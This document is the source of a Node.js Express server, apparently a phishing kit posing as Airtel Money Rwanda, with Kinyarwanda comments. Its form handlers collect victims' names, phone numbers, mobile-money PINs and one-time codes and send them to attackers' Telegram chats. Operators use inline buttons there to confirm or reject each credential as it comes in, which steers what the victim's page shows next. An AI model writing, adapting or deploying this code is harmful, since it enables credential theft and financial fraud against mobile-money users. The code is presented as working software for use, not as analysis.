require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_URL || 'https://airtel-money-rwanda.onrender.com';

// ---------------- IBITONGO BY'UBWITEGARURO ----------------
const approvedPins = {};
const approvedCodes = {};
const blockPins = {};
const requestBotMap = {};

// ---------------- IBITONGO BYA BOT NYINGI ----------------
let bots = [];
Object.keys(process.env).forEach(key => {
    const match = key.match(/^BOT(\d+)_TOKEN$/);
    if (!match) return;
    const index = match[1];
    const botToken = process.env[`BOT${index}_TOKEN`];
    const chatId = process.env[`BOT${index}_CHATID`];
    if (botToken && chatId) {
        bots.push({ botId: `bot${index}`, botToken, chatId });
    }
});
console.log('✅ Bots zashyizwe:', bots.map(b => b.botId));

// ---------------- INTERMEDIAIRE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- IMBARAGA ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
            chat_id: bot.chatId,
            text,
            reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
        });
    } catch (err) {
        console.error('Ibyo Telegram: ', err.response?.data || err.message);
    }
}

async function answerCallback(bot, callbackId) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
            callback_query_id: callbackId
        });
    } catch (err) {
        console.error(err.response?.data || err.message);
    }
}

// ---------------- WEBHOOKS ----------------
async function setWebhook(bot) {
    try {
        const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
        await axios.get(`https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`);
        console.log(`✅ Webhook yashyizweho kuri ${bot.botId}`);
    } catch (err) {
        console.error(`❌ Webhook yananiwe kuri ${bot.botId}:`, err.response?.data || err.message);
    }
}

// Gushyiraho webhook kuri bot zose igihe seriveri itangiye
async function setAllWebhooks() {
    for (const bot of bots) await setWebhook(bot);
}

// ---------------- AMAPAJI ----------------
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Umurongo wa bot siwo');
    res.redirect(`/index.html?botId=${bot.botId}`);
});
app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));

// ---------------- KOHA PIN ----------------
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Bot siwo' });

    const requestId = uuidv4();
    approvedPins[requestId] = null;
    requestBotMap[requestId] = botId;

    sendTelegramMessage(bot, `🔐 KUGENZURA KODE YA PIN\n\nIzina: ${name}\nTelefoni: ${phone}\nPIN: ${pin}`, [[
        { text: '✅ PIN niyo', callback_data: `pin_ok:${requestId}` },
        { text: '❌ PIN siyo', callback_data: `pin_bad:${requestId}` },
        { text: '🛑 Guhagarika', callback_data: `pin_block:${requestId}` }
    ]]);

    res.json({ requestId });
});

app.get('/check-pin/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    if (blockPins[requestId]) return res.json({ blocked: true, message: 'Umukoresha yahagaritswe' });
    res.json({ approved: approvedPins[requestId] ?? null });
});

// ---------------- KOHA KODE ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Bot siwo' });

    const requestId = uuidv4();
    approvedCodes[requestId] = null;
    requestBotMap[requestId] = botId;

    sendTelegramMessage(bot, `🔑 KUGENZURA KODE\n\nIzina: ${name}\nTelefoni: ${phone}\nKode: ${code}`, [[
        { text: '✅ Kode niyo', callback_data: `code_ok:${requestId}` },
        { text: '❌ Kode siyo', callback_data: `code_bad:${requestId}` },
        { text: '✅ Kode niyo + ❌ PIN siyo', callback_data: `code_pin:${requestId}` }
    ]]);

    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    res.json({ approved: approvedCodes[req.params.requestId] ?? null });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');
    let feedback = '';

    if (action === 'pin_ok') { approvedPins[requestId] = true; feedback = 'PIN yemewe ✅'; }
    if (action === 'pin_bad') { approvedPins[requestId] = false; feedback = 'PIN yanzwe ❌'; }
    if (action === 'pin_block') { blockPins[requestId] = true; feedback = 'Umukoresha yahagaritswe 🛑'; }
    if (action === 'code_ok') { approvedCodes[requestId] = true; feedback = 'Kode yemewe ✅'; }
    if (action === 'code_bad') { approvedCodes[requestId] = false; feedback = 'Kode yanzwe ❌'; }
    if (action === 'code_pin') { approvedCodes[requestId] = true; approvedPins[requestId] = false; feedback = 'Kode yemewe – Ongera ushyire PIN'; }

    if (feedback) await sendTelegramMessage(bot, `📝 Igisubizo:\n${feedback}`);
    await answerCallback(bot, cb.id);
    res.sendStatus(200);
});

// ---------------- GUSUZUMA ----------------
app.get('/debug/bots', (req, res) => res.json(bots));

// ---------------- GUTANGIZA SERIVERI ----------------
setAllWebhooks().then(() => {
    app.listen(PORT, () => console.log(`🚀 Seriveri yatangiye kuri port ${PORT}`));
});
